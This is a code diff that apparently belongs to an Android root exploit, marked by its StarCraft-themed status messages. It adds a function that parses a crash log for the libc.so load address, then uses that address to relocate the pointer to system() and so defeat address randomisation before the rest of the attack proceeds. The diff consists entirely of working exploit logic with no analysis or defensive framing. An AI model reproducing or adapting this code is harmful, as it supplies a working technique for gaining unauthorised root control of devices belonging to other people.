@@ -380,6 +380,37 @@ static uint32_t checkcrash()
 }
 
 
+static uint32_t check_libc_base()
+{
+	char buf[1024], *ptr = NULL;
+	FILE *f = NULL;
+	long pos = 0;
+	int ret=0;
+	uint32_t spotted_base = 0;
+
+	if ((f = fopen(crashlog, "r")) == NULL)
+		die("[-] Zerglings did not leave stuff at all");
+	fseek(f, pos, SEEK_SET);
+	do {
+		memset(buf, 0, sizeof(buf));
+		if (!fgets(buf, sizeof(buf), f))
+			break;
+		if ((ptr = strstr(buf, "  /system/lib/libc.so")) != NULL) {
+			ptr -= 8;
+			spotted_base = strtoul(ptr, NULL, 16) & 0xfff00000;
+			if(spotted_base && spotted_base != libc_base) {
+				libc_base = spotted_base;
+				ret = 1;
+			}
+		}
+	} while (!feof(f) && !spotted_base);
+	pos = ftell(f);
+	fclose(f);
+
+	return ret;
+}
+
+
 static uint32_t find_stack_addr()
 {
 	uint32_t fault_addr = 0;
@@ -557,7 +588,17 @@ int main(int argc, char **argv, char **env)
 		printf("[-] This terran has walled!\n");
 		exit(-1);
 	}
-	
+
+	if(check_libc_base()) {
+		system_ptr = libc_base + (system_ptr & 0x000fffff);
+		printf("[*] Creating more creep 0x%08x ...", system_ptr);
+
+		if (check_addr(system_ptr) == -1) {
+			printf("[-] High templars, we're doomed!\n");
+			exit(-1);
+		}
+	}
+
 	kill(logcat_pid, SIGKILL);
 	unlink(crashlog);
 
